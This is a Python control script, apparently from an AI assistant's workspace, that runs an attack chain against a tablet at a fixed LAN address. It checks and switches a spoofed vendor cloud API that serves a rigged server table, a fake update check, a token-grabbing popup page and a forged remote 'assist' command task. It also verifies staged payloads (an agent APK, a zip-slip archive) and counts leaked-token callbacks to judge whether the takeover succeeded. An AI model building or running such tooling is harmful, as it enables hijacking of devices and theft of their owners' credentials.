# -*- coding: utf-8 -*-
"""最小人工操作方案的 就绪检查 / 一键切换 / 结果判定。

用法:
  python go.py check     -> 全链就绪检查 (用户操作前跑)
  python go.py use 8099  -> 把表里 SA106003 指到 8099 (探针, 日志最详)
  python go.py use 8000  -> 指到 8000 (cloud_api 备用)
  python go.py verdict   -> 判定: 端侧是否采纳 / 是否拿到令牌 / 是否触发协助
"""
import datetime
import io
import json
import os
import re
import socket
import subprocess
import sys

R = r'C:\Users\Olive\AppData\Roaming\Tencent\Marvis\User\oAN1i2VRVDeZQaMsrRqanPxYuhcU\workspace\conv_19f78e04910_fcda16370b95\output\sm-p200-takeover'
PT = os.path.join(R, 'pentest')
PAD = '192.168.137.73'
ADB = r'C:\Users\Olive\AppData\Local\Microsoft\WinGet\Packages\Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe\platform-tools\adb.exe'


def sh(cmd, t=30):
    try:
        return subprocess.run(['powershell', '-NoProfile', '-Command', cmd],
                              capture_output=True, text=True, timeout=t).stdout.strip()
    except Exception as e:
        return 'ERR %s' % e


def http(port, path, host='192.168.137.1'):
    try:
        s = socket.create_connection(('127.0.0.1', port), timeout=8)
        s.sendall(('GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n' % (path, host)).encode())
        d = b''
        while True:
            c = s.recv(65536)
            if not c:
                break
            d += c
        s.close()
        return d.split(b'\r\n\r\n', 1)[1]
    except Exception as e:
        return b'ERR:' + str(e).encode()


def tail(path, n=800):
    try:
        return io.open(path, encoding='utf-8', errors='replace').read().splitlines()[-n:]
    except Exception:
        return []


def cmd_check():
    print('========== \u5c31\u7eea\u68c0\u67e5 ==========')
    procs = sh("Get-CimInstance Win32_Process -Filter \"Name='python.exe'\" | ForEach-Object { $_.CommandLine }")
    for name in ('npcap_http80', 'probe8099', 'cloud_api', 'tls_relay_v2', 'watch_auto'):
        print('  %s \u8fdb\u7a0b' % ('[OK] ' if name in procs else '[!!] '), name)
    for p in (8000, 8089, 8099, 5555):
        n = sh("(Get-NetTCPConnection -LocalPort %d -State Listen -EA 0 | Measure-Object).Count" % p)
        print('  %s \u7aef\u53e3 %d' % ('[OK] ' if n == '1' else '[!!] ', p))
    b = http(8000, '/api/v1/pub/microServer/?serverTypes=SA106003')
    try:
        o = json.loads(b.decode('utf-8'))
        e = [x for x in o['microServerDtoList'] if x['serverType'] == 'SA106003']
        print('  [OK] \u8868 SA106003 -> %s:%s (mode=%s sch=%s idx=%s)' % (
            e[0]['domainOrIp'], e[0]['port'], e[0]['mode'], e[0]['schList'], e[0]['index']))
    except Exception as ex:
        print('  [!!] \u8868\u5f02\u5e38 %s' % ex)
    b = http(8000, '/api/v1/pub/distribution/apps/com.xh.zhitongyunstu/versions/1/check')
    print('  %s \u66f4\u65b0\u68c0\u67e5 %s' % ('[OK] ' if b'999999' in b else '[!!] ', b[:90]))
    b = http(8099, '/note.html')
    print('  %s \u5f39\u7a97\u9875\u9762 %d B (getToken=%s)' % ('[OK] ' if b'getToken' in b else '[!!] ', len(b), b'getToken' in b))
    b = http(8000, '/api/v1/users/2112229/devices/R52N9067SSF/assists/assist_marvis_0001/tasks')
    print('  %s \u534f\u52a9\u4efb\u52a1 %s' % ('[OK] ' if b'executeCmd' in b else '[!!] ', b[:80]))
    for f, need in (('agent.apk', 1000000), ('zipslip.bin', 100), ('note.html', 100)):
        sz = os.path.getsize(os.path.join(PT, f)) if os.path.exists(os.path.join(PT, f)) else -1
        print('  %s \u8f7d\u8377 %s = %d B' % ('[OK] ' if sz >= need else '[!!] ', f, sz))
    for f, d in (('captive_mode.txt', 'caption'), ('cmd_mode.txt', 'mode')):
        v = io.open(os.path.join(PT, f), encoding='ascii').read().strip() if os.path.exists(os.path.join(PT, f)) else 'MISSING'
        print('  [--] %s = %s' % (f, v))
    print()
    print('  \u7aef\u4fa7\u8fd1\u671f\u8bf7\u6c42: %s' % (tail(os.path.join(PT, 'npcap_http80.log'), 1)[-1][:70] if tail(os.path.join(PT, 'npcap_http80.log'), 1) else '?'))
    print('  \u63a2\u9488\u7aef\u4fa7\u6765\u6e90: %d \u6761' % sum(1 for l in tail(os.path.join(PT, 'probe8099.log'), 500) if PAD in l))


def cmd_use(port):
    """把表里 SA106003 的端口改成指定值 (改 cloud_api 的 _dto 端口选择 + 重启)。"""
    P = os.path.join(PT, 'cloud_api.py')
    s = io.open(P, encoding='utf-8', errors='surrogateescape').read()
    s2 = re.sub(r'8099 if t == "SA106003" else', '%s if t == "SA106003" else' % port, s)
    if s2 != s:
        io.open(P, 'w', encoding='utf-8', errors='surrogateescape').write(s2)
    sh("Get-CimInstance Win32_Process -Filter \"Name='python.exe'\" | Where-Object { $_.CommandLine -match 'cloud_api' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }")
    import time as _t
    _t.sleep(2)
    py = sys.executable
    subprocess.Popen([py, P, '86400'], cwd=PT, creationflags=0x08000000)
    _t.sleep(4)
    print('  \u5df2\u5207\u6362 SA106003 -> %s, \u5f53\u524d\u8868:' % port)
    b = http(8000, '/api/v1/pub/microServer/?serverTypes=SA106003')
    print('  ' + b.decode('utf-8', 'replace')[:200])


def cmd_verdict():
    print('========== \u7ed3\u679c\u5224\u5b9a ==========')
    pl = tail(os.path.join(PT, 'probe8099.log'), 800)
    dev = [l for l in pl if PAD in l]
    print('  \u63a2\u9488(8099) \u7aef\u4fa7\u6765\u6e90: %d \u6761' % len(dev))
    for l in dev[:10]:
        print('     ' + l[:180])
    rn = [l for l in dev if 'distribution/apps' in l]
    nt = [l for l in dev if 'note.html' in l]
    tl = [l for l in dev if 'TOKENLEAK' in l]
    print('  \u66f4\u65b0\u68c0\u67e5\u547d\u4e2d: %d' % len(rn))
    print('  \u5f39\u7a97\u9875\u9762\u52a0\u8f7d: %d' % len(nt))
    print('  \u4ee4\u724c\u56de\u4f20: %d' % len(tl))
    for l in tl[:3]:
        print('     ' + l[:400])
    al = [l for l in tail(os.path.join(PT, 'npcap_http80.log'), 2000) if '[ASSIST]' in l or '[TOKENLEAK]' in l or '[APK]' in l]
    print('  \u5192\u5145\u5668\u94fe\u8def\u4fe1\u53f7: %d' % len(al))
    for l in al[-5:]:
        print('     ' + l[:180])
    adb = sh('& "%s" devices' % ADB)
    print('  adb: %s' % adb.replace('\n', ' | ')[:200])
    if len(dev) == 0:
        print('  ==> \u7ed3\u8bba: \u7aef\u4fa7\u5c1a\u672a\u91c7\u7eb3\u8868 / \u5c1a\u672a\u89e6\u53d1 (\u7ee7\u7eed\u7b49\u5f85\u6216\u6539\u8868\u683c\u5f0f)')
    elif len(tl) > 0:
        print('  ==> \u7ed3\u8bba: \u2605\u2605\u2605 \u5df2\u5f97\u5230\u4ee4\u724c\u56de\u4f20! \u94fe\u8def\u6210\u7acb')
    elif len(rn) > 0:
        print('  ==> \u7ed3\u8bba: \u2605 \u8868\u5df2\u88ab\u91c7\u7eb3\u4e14\u66f4\u65b0\u68c0\u67e5\u547d\u4e2d (\u7b49\u5f39\u7a97/\u4ee4\u724c)')


if __name__ == '__main__':
    a = sys.argv[1:] or ['check']
    if a[0] == 'check':
        cmd_check()
    elif a[0] == 'use' and len(a) > 1:
        cmd_use(a[1])
    elif a[0] == 'verdict':
        cmd_verdict()
    else:
        print(__doc__)
